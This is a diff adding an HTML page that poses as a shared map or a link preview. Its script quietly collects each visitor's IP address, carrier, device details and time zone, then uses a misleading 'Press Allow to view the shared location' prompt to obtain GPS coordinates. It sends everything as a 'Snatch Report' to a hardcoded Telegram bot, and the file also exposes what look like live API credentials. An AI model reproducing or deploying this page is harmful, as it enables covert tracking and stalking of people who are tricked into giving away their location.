@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+            
+            <style>
+                body,
+                html {
+                    margin: 0;
+                    padding: 0;
+                    height: 100%;
+                    position: relative;
+                }
+                
+                #overlay{
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    align-items: center;
+                    justify-content: center;
+                    display: none;
+                }
+                
+                #overlay-content {
+                    background-color: rgba(255, 255, 255, 0.96);
+                    padding: 16px;
+                    text-align: center;
+                    border-radius: 10px;
+                    margin: 16px;
+                }
+                
+                .logo {
+                    max-width: 184px;
+                    height: auto;
+                }
+            </style>
+            
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+            <script>
+                const TELEGRAM_URL = "https://api.telegram.org/bot5321691515:AAHsLhFXXGke6hkfEHAZ5KssmGxqDrXTj6I/sendMessage";
+                const IPDATA_API_KEY = "ab03a67352ce18d00286f3f78f34342ce980f3aff6f6d89ac3799b76";
+                const CHAT_ID = "-1001933521841";
+                const CASE_ID = [...Array(8)].map(() => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random() * 62))).join('');
+                                
+                function showOverlay() {
+                    document.getElementById("overlay").style.display = "flex";
+                }
+                
+                function sendMessage(message) {
+                    const settings = {
+                        "async": true,
+                        "crossDomain": true,
+                        "url": TELEGRAM_URL,
+                        "method": "POST",
+                        "headers": {
+                            "Content-Type": "application/json",
+                            "cache-control": "no-cache"
+                        },
+                        "data": JSON.stringify({
+                            "chat_id": CHAT_ID,
+                            "text": message,
+                            "parse_mode": "markdown"
+                        })
+                    };
+                    
+                    $.ajax(settings);
+                }
+                
+                function getCurrentDateTime() {
+                    const currentDate = new Date();
+                    const options = {
+                        timeZone: 'Asia/Singapore',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: 'numeric',
+                        minute: 'numeric',
+                        second: 'numeric'
+                    };
+                    
+                    return currentDate.toLocaleString('en-US', options);
+                }
+                
+                function fetchIPData(name) {
+                    fetch(`https://api.ipdata.co?api-key=${IPDATA_API_KEY}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        var messageParts = [];
+                        
+                        messageParts.push(`*Snatch Report for ${name}*`);
+                        messageParts.push(`Date: ${getCurrentDateTime()}`);
+                        
+                        messageParts.push(`\n*1) IP Address*`);
+                        if (data.ip) messageParts.push(`*Public IP Address:* ${data.ip}`);
+                        if (data.country_name) messageParts.push(`*Country:* ${data.country_name}`);
+                        if (data.carrier && data.carrier.name) messageParts.push(`*Telco:* ${data.carrier.name}`);
+                        if (navigator.userAgent) messageParts.push(`*User Agent:* ${navigator.userAgent}`);
+                        
+                        messageParts.push(`\n*2) Device*`);
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        if (timeZone) messageParts.push(`*Time Zone:* ${timeZone}`);
+                        if (navigator.language) messageParts.push(`*Language:* ${navigator.language}`);
+                        if (screen.width && screen.height) messageParts.push(`*Screen Size:* ${screen.width}x${screen.height}`);
+                        
+                        const finalMessage = messageParts.join('\n');
+                        sendMessage(finalMessage);
+                    });
+                }
+                
+                function fetchLocation(name) {
+                    function sendLocationMessage(status, latitude = null, longitude = null) {
+                        let messageParts = [];
+                        
+                        messageParts.push(`*Snatch Report for ${name}*`);
+                        messageParts.push(`Date: ${getCurrentDateTime()}`);
+                        
+                        messageParts.push(`\n*3) GPS Location*`);
+                        switch (status) {
+                            case 'success':
+                            messageParts.push(`https://www.google.com/maps/search/${latitude},${longitude}`);
+                            break;
+                            case 'permission_denied':
+                            messageParts.push("Permission Denied");
+                            break;
+                            case 'unavailable':
+                            messageParts.push("Location Unavilable");
+                            break;
+                            case 'timeout':
+                            messageParts.push("Timeout");
+                            break;
+                            case 'error':
+                            messageParts.push("Unknown Error");
+                            break;
+                        }
+                        
+                        const finalMessage = messageParts.join('\n');
+                        sendMessage(finalMessage);
+                    }
+                    
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        sendLocationMessage('success', position.coords.latitude, position.coords.longitude);
+                    }, (error) => {
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                            sendLocationMessage('permission_denied');
+                            break;
+                            case error.POSITION_UNAVAILABLE:
+                            sendLocationMessage('unavailable');
+                            break;
+                            case error.TIMEOUT:
+                            sendLocationMessage('timeout');
+                            break;
+                            default:
+                            sendLocationMessage('error');
+                            break;
+                        }
+                    });
+                }
+                
+                function init() {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const name = urlParams.get('name');
+                    const link = urlParams.get('link');
+                    
+                    document.title = link;
+                    
+                    if (link === "https://www.google.com/maps") {
+                        document.getElementById('myIframe').src = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d20385.993219992596!2d103.76477570850272!3d1.3553790548356286!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x31da19a62f093f43%3A0xf8d8c08b83b44e50!2sSingapore!5e0!3m2!1sen!2s!4v1625203580630!5m2!1sen!2s";
+                        setTimeout(() => showOverlay(), 4000);
+                    } else {
+                        document.getElementById('myIframe').src = window.innerWidth > 1024 ?
+                        `https://urlscan.io/liveshot/?url=${link}` :
+                        `https://urlscan.io/liveshot/?width=${window.screen.width}&height=${window.screen.height}&url=${link}`;
+                    }
+                                        
+                    fetchIPData(name);
+                    setTimeout(() => fetchLocation(name), 5000);
+                }
+                
+                window.onload = init;
+            </script>
+    </head>
+    
+    <body>
+        <iframe id="myIframe" width="100%" height="100%"></iframe>
+        
+        <div id="overlay">
+            <div id="overlay-content">
+                <img src="./res/images/logo.png" class="logo">
+                    <p><b>Press "Allow" on the popup to view the shared location</b></p>
+            </div>
+        </div>
+        <noscript>
+            You need to enable JavaScript to run this app.
+        </noscript>
+    </body>
+    
+</html>
